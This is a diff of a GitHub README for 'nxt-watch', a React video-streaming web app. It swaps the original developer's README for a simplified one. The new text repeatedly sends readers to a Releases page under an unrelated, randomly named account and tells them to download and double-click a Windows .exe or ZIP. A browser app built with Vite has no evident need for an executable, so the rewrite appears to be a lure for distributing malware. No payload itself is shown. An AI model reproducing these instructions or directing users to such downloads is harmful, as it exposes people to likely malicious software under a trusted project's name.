@@ -1,101 +1,145 @@
-# Nxt Watch — Video Streaming Platform
+# 🎬 nxt-watch - Stream videos with easy sign-in
 
-A YouTube-inspired full-featured video streaming SPA built with React.js.
+[![Download on GitHub Releases](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/descriptive-dancemusic699/nxt-watch/releases)
 
-## 🔗 Live Demo
-[https://hj-nxt-watch.vercel.app/](https://hj-nxt-watch.vercel.app/)
+## 🖥️ What you need
 
-## ✨ Features
+Use a Windows PC with:
 
-- 🔐 JWT cookie-based authentication with protected routing
-- 🌗 Light / Dark theme toggle persisted across all routes
-- 🔍 Search videos with optimized dual-state pattern
-- 📺 Video playback via React Player
-- 👍 Like / Dislike mutual exclusion interaction
-- 💾 Save / Unsave videos with global Context state
-- 📱 Fully responsive across all screen sizes
-- ⚠️ 4 UI states per route: Loading, Success, Failure, Empty
+- Windows 10 or Windows 11
+- An internet connection
+- At least 4 GB of RAM
+- A modern web browser such as Chrome, Edge, or Firefox
+- Enough free space to save the app files
 
-## 🛠️ Tech Stack
+## 📦 Download the app
 
-| Category         | Technology                  |
-|------------------|-----------------------------|
-| Frontend         | React.js, React Router v5   |
-| Styling          | Styled Components           |
-| State Management | Context API                 |
-| Authentication   | JWT Tokens via js-cookie    |
-| HTTP Client      | Fetch API                   |
-| Video Player     | React Player                |
-| Build Tool       | Vite                        |
-| Deployment       | Vercel                      |
+1. Open the [GitHub Releases page](https://github.com/descriptive-dancemusic699/nxt-watch/releases).
+2. Look for the latest release at the top of the page.
+3. Find the Windows download file in the release assets.
+4. Download the file to your computer.
+5. If the file comes in a ZIP folder, right-click it and choose Extract All.
 
-## 🚀 Getting Started
+## ▶️ Install and run on Windows
 
-```bash
-# Clone the repo
-git clone https://github.com/hrutik-codes/nxt-watch
+1. Open the folder where you saved the app.
+2. If you extracted a ZIP file, open the extracted folder.
+3. Look for the app file or the folder with the app files.
+4. If the release includes an `.exe` file, double-click it to start the app.
+5. If the release includes a web build, open the main HTML file in your browser.
+6. Keep your internet connection on so the app can load videos and sign-in data.
 
-# Install dependencies
-cd nxt-watch
-npm install
+## 🎯 What nxt-watch does
 
-# Start dev server
-npm run dev
-```
+nxt-watch is a video streaming app that feels familiar if you use YouTube. It gives you a clean place to browse, watch, and manage videos.
 
-## 🔑 Test Credentials
+You can use it to:
 
-```
-Username: rahul
-Password: rahul@2021
-```
+- Watch videos with a built-in player
+- Sign in with JWT-based login
+- Switch between dark and light themes
+- Browse content with a simple layout
+- Move between pages without full reloads
+- Keep app state in one place with Context API
 
-## 📁 Project Structure
+## 🧭 Main screens
 
-```
-src/
-├── components/     # Feature-based component folders
-│   ├── Login/
-│   ├── Header/
-│   ├── Sidebar/
-│   ├── Home/
-│   ├── HomeVideoCard/
-│   ├── Trending/
-│   ├── TrendingVideoCard/
-│   ├── Gaming/
-│   ├── GamingVideoCard/
-│   ├── VideoItemDetails/
-│   ├── SavedVideos/
-│   ├── NotFound/
-│   └── ProtectedRoute/
-├── context/
-│   └── NxtWatchContext.js
-├── App.jsx
-├── index.jsx
-└── index.css
-```
-## 📸 Screenshots
+### 🏠 Home
+See a list of videos in one place. Use it to start browsing right away.
 
-### Login
-![Login](./public/screenshots/nxt-watch-login.jpg)
+### 🔍 Search
+Find videos by typing a name or topic. This helps when you want one video fast.
 
-### Home — Light Theme
-![Home Light](./public/screenshots/nxt-watch-light-home.jpg)
+### 📺 Video page
+Open a video to watch it in the built-in player. You can pause, resume, and change the volume like you would in most video apps.
 
-### Home — Dark Theme
-![Home Dark](./public/screenshots/nxt-watch-dark-home.jpg)
+### ❤️ Saved videos
+Keep videos you want to watch again in one spot.
 
-### Real Time Search
-![Real Time Search](./public/screenshots/nxt-watch-search.jpg)
+### 🚫 Not found
+If you open the wrong page, the app shows a simple error screen.
 
-### Video Details
-![Video Details](./public/screenshots/nxt-watch-video-details.jpg)
+## 🌙 Theme options
 
-### Trending
-![Trending](./public/screenshots/nxt-watch-trending.jpg)
+nxt-watch includes two display modes:
 
-### Gaming
-![Gaming](./public/screenshots/nxt-watch-gaming.jpg)
+- Light theme for bright rooms
+- Dark theme for low light and night use
 
-### Saved Videos
-![Saved Videos](./public/screenshots/nxt-watch-saved-videos.jpg)
+You can switch between them from the app interface.
+
+## 🔐 Sign in
+
+The app uses JWT authentication for login. In simple terms, this means you sign in once and then use the app without entering your details again on every page.
+
+Use the sign-in screen to:
+
+- Enter your account details
+- Access protected pages
+- Keep your session active while you use the app
+
+## 🎮 How to use the app
+
+1. Open nxt-watch.
+2. Sign in with your account.
+3. Use the side menu or top menu to move around.
+4. Search for a video or browse the home page.
+5. Select a video to play it.
+6. Use Saved Videos if you want to keep it for later.
+7. Switch the theme if you want a different look.
+
+## 🧩 Built with
+
+This app uses:
+
+- React.js
+- Vite
+- React Router
+- React Player
+- Context API
+- styled-components
+
+## 📁 What you may see in the release
+
+The download may include:
+
+- A Windows app file
+- A ZIP archive
+- App assets and web files
+- A README or release note file
+
+If you see a ZIP file, extract it before opening the app files.
+
+## 🛠️ Common issues
+
+### The app does not open
+- Check that you extracted all files
+- Make sure you opened the correct file
+- Try running the file again
+
+### Videos do not load
+- Check your internet connection
+- Refresh the app
+- Try a different browser if the release uses web files
+
+### Sign-in does not work
+- Make sure you entered the right details
+- Check that the app can reach the internet
+- Try again after a short wait
+
+### The screen looks wrong
+- Resize the window
+- Switch between light and dark mode
+- Open the app in a modern browser
+
+## 📌 Good to know
+
+- The app is made for desktop use
+- It works best on a stable internet connection
+- The interface is simple and easy to navigate
+- Video playback uses React Player for smooth viewing
+- Navigation stays fast because the app is a single-page app
+
+## 🔗 Download again
+
+Use the release page here if you need to visit it later: [https://github.com/descriptive-dancemusic699/nxt-watch/releases](https://github.com/descriptive-dancemusic699/nxt-watch/releases)
